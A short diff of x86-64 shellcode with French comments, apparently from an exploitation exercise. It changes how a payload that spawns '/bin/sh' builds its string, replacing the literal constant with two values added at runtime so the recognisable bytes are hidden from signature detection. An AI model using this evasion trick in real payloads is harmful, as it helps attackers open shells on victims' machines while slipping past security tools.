@@ -57,7 +57,8 @@ _start:
 
     xor rax, rax
     xor rdx, rdx
-    mov rbx, 0x68732f6e69622f2f
+    mov rbx, 0x68732f6e584d0a31    ;0x68732f6e69622f2f
+    add rbx, 0x111524fe
     push rax                    ; IMPORTANT 
     push rbx                    ; on met rbx sur la stack
     mov rdi, rsp                ; on stock l'adresse de rbx (qui viens d'etre push) dans rdi (arg1)
